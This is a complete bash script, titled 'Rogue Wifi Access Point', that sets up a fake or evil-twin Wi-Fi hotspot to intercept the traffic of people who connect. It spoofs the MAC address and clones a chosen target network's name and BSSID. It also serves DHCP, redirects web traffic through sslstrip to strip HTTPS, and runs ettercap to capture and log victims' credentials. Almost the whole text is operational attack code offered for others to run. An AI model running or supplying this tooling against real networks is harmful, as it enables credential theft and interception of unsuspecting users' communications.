#!/bin/bash

# This is a simple bash script that sets up a rogue ap and sniffs traffic.
# There are two modes of operation, normal mode (default) and twin mode
# In normal mode, the rogue ap essid is WLAN_XXXX, where X is an hex random,
# unless it is specified by -e | --essid argument.
# In twin mode, the script will prompt for the target ap using airodump, 
# and it will clone it with the strongest signal as possible.
# In both modes, the script will can run in verbose mode (default) or in quiet mode,
# writing ettercap logs to a file.
# 
# Requires ettercap, sslstrip, airodump-ng (only in twin mode), airmon-ng (both included in aircrack suite),
# macchanger and isc-dhcp-server.
#
# Usage is:
#     rwap.sh -i <wireless_interface> [OPTIONS]
#     -i | --interface <wireless_interface>	-- The interface of the wireless card to be used for mounting the rogue ap
#     OPTIONS:
# 		-d | --dhcpdconf <dhcpd.conf>	-- The dhcpd.conf configuration file
# 		-e | --essid <rogue ap essid>	-- ESSID of the rogue ap
# 		-h | --help			-- Show this help
# 		-m | --mode <mode>		-- Mode operation: "normal" (default) and "twin"
# 		-o | --output <file>		-- Ettercap output file
# 	
# Examples:
# 
# Normal verbose mode: rwap.sh -i wlan0 -e free_wifi
# Normal quiet mode: rwap.sh -i wlan0 -m normal -o outputfile
# Twin verbose mode: rwap.sh -i wlan0 -m twin
# 
# There are probably much better solutions. However, you are free to test this one,
# improve it, share it, or simply ignore it.
# 
# Replies to @s0nH4cK, s0nh4ck@gmail.com or elblogdes0nh4ck.blogspot.com


####################
# GLOBAL VARIABLES # 
####################

mode=''		# Mode operation
iface=''	# Wireless interface
out=''		# Output file
essid=''		# Name of the rogue ap
dhcpdconf=''	# dhcpd.conf configuration file

# Sizes for the different shells
shell_1=''
shell_2=''
shell_3=''
shell_4=''

VERSION='0.0.1alpha'


#########################
# FUNCTION DECLARATIONS # 
#########################

# Banner
function banner()
{
printf "                              
_________  _  _______  ______  
\_  __ \ \/ \/ /\__  \ \____ \  
 |  | \/\     /  / __ \|  |_> > 
 |__|    \/\_/  (____  /   __/  
                     \/|__|    
Rogue Wifi Access Point v$VERSION
			@s0nH4cK\n\n"
}

# Very very dirty stuff to split shells
function shells()
{
  res=`xrandr | grep -v disconnected | grep -m 1 connected | cut -d' ' -f3 | cut -d'+' -f1`
  resx=`echo $res | cut -d'x' -f1`
  resy=`echo $res | cut -d'x' -f2`
    
  xinchar=$((resx/7))
  yinchar=$((resy/13))

  x2=$((xinchar/2-1))
  y2=$((yinchar/2-4))
  offx=$((resx/2))

  shell_1=$x2'x'$y2'+0+0'	# Upper left
  shell_2=$x2'x'$y2'+0+'$offx	# Bottom left
  shell_3=$x2'x'$y2'+'$offx'+0'	# Upper right
  shell_4=$x2'x'$y2'+'$offx'-0'	# Bottom right
}

# Disable network services
function disable_network_services()
{
  echo '[+] Disabling network services'
  /etc/init.d/network-manager stop &> /dev/null
  killall wpa_supplicant dhclient &> /dev/null
}

# Configure wireless interface
function configure_wireless_interface()
{
  echo '[+] Configuring wireless interface'
  ifconfig $iface down 1>/dev/null
   if [[ $? != 0 ]]
  then
    echo "[--] Could not take down $iface"
    revert1
  fi
  
  new_mac=`echo $(macchanger -r $iface | grep New)  |  cut -d' ' -f3`
  if [[ $? != 0 ]]
  then
    echo "[--] Could not change mac address"
    revert1
  fi
  echo "[++] New mac address is $new_mac"
  iw reg set BO 1> /dev/null
}

# Configure air* suite
function start_air_suite()
{
  local bssid=''
  local essid=''
  local options=''
  
  echo '[+] Starting monitor mode'
  mon=`airmon-ng start $iface  | grep "monitor mode enabled on" | awk '{print $5}' | cut -d')' -f1`
  if [[ $? != 0 ]]
  then
    echo '[--] Could not start monitor mode'
  fi
    
  if [[ "$mode" == "twin" ]]
  then
    echo '[+] Starting airodump to select target'
    airodump-ng $mon
    if [[ $? != 0 ]]
    then
      echo '[--] Could not start airodump'
      revert2
    fi
    echo '[++] Enter target BSSID: '
    read bssid
    echo '[++] Enter target ESSID: '
    read essid
    options="-a $bssid -e $essid"
  else
    if [ -z $essid ]
    then
      term1=`echo $new_mac | cut -d':' -f5`
      term1=${term1^^}
      term2=`echo $new_mac | cut -d':' -f6`
      term2=${term2^^}
      essid="WLAN_"$term1$term2
    fi
    options="-e $essid"
  fi
  
  echo "[+] Starting rogue ap with ESSID $essid"
  exit1=""
  if [ -z $out ]
  then
    xterm -fn 7x13 -geometry $shell_1 -hold -e "airbase-ng -c 11 $options $mon" &
    exit1=$?
    sleep 5
  else
    airbase-ng -c 11 $options $mon &> /dev/null &
    exit1=$?
    sleep 5
  fi
  if [[ $exit1 != 0 ]]
  then
    echo '[--] Could not start airbase'
    revert2
  fi
    
}

# Configure rogue ap
function configure_rogue_ap()
{
  echo '[+] Configuring rogue ap network settings'
  ifconfig at0 up
  if [[ $? != 0 ]]
  then
    echo '[--] Could not take up at0 interface'
    revert2
  fi
  ifconfig at0 10.0.0.1 netmask 255.255.255.0
  if [[ $? != 0 ]]
  then
    echo '[--] Could not configure at0 interface'
    revert3
  fi
  ifconfig at0 mtu 1400
}

# Add route to system
function add_route()
{
  echo '[+] Adding route to system'
  route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
  if [[ $? != 0 ]]
  then
    echo '[--] Could add route to system'
    revert3
  fi
}

# Enable routing
function enable_routing()
{
  echo '[+] Enabling routing'
  echo "1" > /proc/sys/net/ipv4/ip_forward
  if [[ $? != 0 ]]
  then
    echo '[--] Could not enable routing'
    revert4
  fi
}

# Configure iptables
function configure_iptables()
{
  echo '[+] Configuring iptables'
  echo '[++] Deleting old tables'
  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain

  echo '[++] Configuring new settings'
  iptables -P FORWARD ACCEPT
  iptables -A FORWARD -i at0 -j ACCEPT
  iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
}

# Start dhcp
function start_dhcp()
{
  echo '[+] Starting dhcp server'
  if [ -z $out ]
  then
    xterm -fn 7x13 -geometry $shell_2 -hold -e "dhcpd -cf $dhcpdconf -f -d; /etc/init.d/isc-dhcp-server start" &
    exit1=$?
    sleep 5
  else
    dhcpd -cf $dhcpdconf -f -d &> /dev/null &
    /etc/init.d/isc-dhcp-server start &> /dev/nul &
    exit1=$?
    sleep 5
  fi
  
  if [[ $exit1 != 0 ]]
  then
    echo '[--] Could not start dhcp'
    revert4
  fi
}

# Start sslstrip
function start_sslstrip()
{
  echo '[+] Starting sslstrip'
  if [ -z $out ]
  then
    xterm -fn 7x13 -geometry $shell_3 -hold -e "sslstrip -f -p -k 10000" &
    exit1=$?
  else
    sslstrip -f -p -k 10000 &> /dev/null &
    exit1=$?
  fi
  
  if [[ $exit1 != 0 ]]
  then
    echo '[--] Could not start sslstrip'
    revert5
  fi
}

# Start ettercap
function start_ettercap()
{
  echo '[+] Starting ettercap'
  if [ -z $out ]
  then
    xterm -fn 7x13 -geometry $shell_4 -hold -e "ettercap -p -u -T -q -i at0" &
    exit1=$?
  else
    ettercap -p -u -T -q -i at0 -w $out &
    exit1=$?
  fi
  
  if [[ $exit1 != 0 ]]
  then
    echo '[--] Could not start ettercap'
    revert6
  fi
}

# Print help
function print_help()
{
    echo 'Usage is rwap.sh -i <wireless_interface> [OPTIONS]'
    echo '-i | --interface <wireless_interface>		-- The interface of the wireless card to be used for mounting the rogue ap'
    echo 'OPTIONS:'
    echo '	-d | --dhcpdconf <dhcpd.conf>		-- The dhcpd.conf configuration file'
    echo '	-e | --essid <rogue ap essid>	-- ESSID of the rogue ap'
    echo '	-h | --help			-- Show this help'
    echo '	-m | --mode <mode>		-- Mode operation: "normal" (default) or "twin"'
    echo '	-o | --output <file>		-- Ettercap output file'
}

function revert1()
{  
  ifconfig $iface down &> /dev/null
  ifconfig $iface up &> /dev/null
  /etc/init.d/network-manager start &> /dev/null
  wpa_supplicant dhclient &> /dev/null
  dhclient &> /dev/null
  exit 1
}

function revert2()
{
  ifconfig $mon down &> /dev/null
  revert1
}

function revert3()
{
  ifconfig at0 down &> /dev/null
  revert2
}

function revert4()
{
   route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 &> /dev/null
   revert3
}

function revert5()
{
  /etc/init.d/isc-dhcp-server stop 2> /dev/null
  revert4
}

function revert6()
{
  killall sslstrip
  revert5
}
#################
# MAIN FUNCTION # 
#################

banner

if [ -z "$1" ]
then
  print_help
  exit 0
else
  # Parse arguments
  while [ -n "$1" ]
  do
    case "$1" in
    -d | --dhcpdconf) shift; dhcpdconf=$1; shift;;
    -h | --help) print_help; exit 0;;
    -i | --interface) shift; iface=$1; shift;; 
    -m | --mode) shift; mode=$1; shift;;
    -e | --essid) shift; essid=$1; shift;;
    -o | --output) shift; out=$1; shift;;
    *) print_help; exit 0;;
    esac
  done
fi

if [ -z $out ]
then
  shells
fi

disable_network_services
configure_wireless_interface
start_air_suite
configure_rogue_ap
add_route
enable_routing
configure_iptables
start_dhcp
start_sslstrip
start_ettercap